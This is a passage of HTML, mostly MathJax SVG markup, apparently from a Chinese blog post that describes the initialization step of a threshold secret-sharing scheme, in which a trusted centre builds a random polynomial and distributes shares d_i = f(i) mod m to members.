-187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(3306.2, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4306.5, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="10.794ex" height="2.156ex" role="img" focusable="false" viewBox="0 -759 4771.2 953"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(737.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1793.6, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(2293.6, 0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(510.7, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(3270.9, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(4271.2, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>，记<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="8.403ex" height="2.156ex" role="img" focusable="false" viewBox="0 -759 3714.2 953"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1155.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2211.6, 0)"><g data-mml-node="mi"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mo" transform="translate(503, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="msup" transform="translate(2959, 0)"><g data-mml-node="mi"><path data-c="1D45E" d="M33 157Q33 258 109 349T280 441Q340 441 372 389Q373 390 377 395T388 406T404 418Q438 442 450 442Q454 442 457 439T460 434Q460 425 391 149Q320 -135 320 -139Q320 -147 365 -148H390Q396 -156 396 -157T393 -175Q389 -188 383 -194H370Q339 -192 262 -192Q234 -192 211 -192T174 -192T157 -193Q143 -193 143 -185Q143 -182 145 -170Q149 -154 152 -151T172 -148Q220 -148 230 -141Q238 -136 258 -53T279 32Q279 33 272 29Q224 -10 172 -10Q117 -10 75 30T33 157ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(510.7, 363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g></g></g></svg></mjx-container>。</p>
<h2 id="初始化-2"><a href="#初始化-2" class="headerlink" title="初始化"></a>初始化</h2><p>可信中心TC随机选取次数不超过<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="4.714ex" height="1.692ex" role="img" focusable="false" viewBox="0 -666 2083.4 748"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mo" transform="translate(583.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1583.4, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>的多项式</p>
<script type="math/tex; mode=display">f(x)=\sum_{j=0}^{t-1}a_jx^j\in Z_m[x]</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="6.303ex" height="1.945ex" role="img" focusable="false" viewBox="0 -694 2786.1 859.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mn" transform="translate(529, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mo" transform="translate(1210.3, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2266.1, 0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="23.174ex" height="2.363ex" role="img" focusable="false" viewBox="0 -750 10242.9 1044.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(1148.1, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="msub" transform="translate(2092.9, 0)"><g data-mml-node="mi"><path data-c="1D44D" d="M58 8Q58 23 64 35Q64 36 329 334T596 635L586 637Q575 637 512 637H500H476Q442 637 420 635T365 624T311 598T266 548T228 469Q227 466 226 463T224 458T223 453T222 450L221 448Q218 443 202 443Q185 443 182 453L214 561Q228 606 241 651Q249 679 253 681Q256 683 487 683H718Q723 678 723 675Q723 673 717 649Q189 54 188 52L185 49H274Q369 50 377 51Q452 60 500 100T579 247Q587 272 590 277T603 282H607Q628 282 628 271Q547 5 541 2Q538 0 300 0H124Q58 0 58 8Z"></path></g><g data-mml-node="mi" transform="translate(683, -150) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3446.7, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3835.7, 0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(4525.5, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5581.3, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6081.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(6525.9, 0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(7025.9, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(7470.6, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(8809.3, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(9253.9, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(9853.9, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>。</p>
<p>TC计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="1.842ex" height="1.927ex" role="img" focusable="false" viewBox="0 -694 814 851.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>，并将其发送给成员<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.357ex" xmlns="http://www.w3.org/2000/svg" width="2.118ex" height="1.902ex" role="img" focusable="false" viewBox="0 -683 936 840.8"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(642, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container>：</p>
<script type="math/tex; mode=display">d_i=f(i)\bmod m</script><p>同时计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="6.293ex" height="1.805ex" role="img" focusable="false" viewBox="0 -716 2781.6 798"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D70B" d="M132 -11Q98 -11 98 22V33L111 61Q186 219 220 334L228 358H196Q158 358 142 355T103 336Q92 329 81 318T62 297T53 285Q51 284 38 284Q19 284 19 294Q19 300 38 329T93 391T164 429Q171 431 389 431Q549 431 553 430Q573 423 573 402Q573 371 541 360Q535 358 472 358H408L405 341Q393 269 393 222Q393 170 402 129T421 65T431 37Q431 20 417 5T381 -10Q370 -10 363 -7T347 17T331 77Q330 86 330 121Q330 170 339 226T357 318T367 358H269L268 354Q268 351 249 275T206 114T175 17Q164 -11 132 -11Z"></path></g><g data-mml-node="mo" transform="translate(847.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1903.6, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2503.6, 0)"><path data-c="21" d="M78 661Q78 682 96 699T138 716T180 700T199 661Q199 654 179 432T158 206Q156 198 139 198Q121 198 119 206Q118 209 98 431T78 661ZM79 61Q79 89 97 105T141 121Q164 119 181 104T198 61Q198 31 181 16T139 1Q114 1 97 16T79 61Z"></path></g></g></g></svg></mjx-container>。</p>
<p>TC公开<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="2.009ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 888 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g></g></g></svg></mjx-container>、<mjx-container class="MathJax" 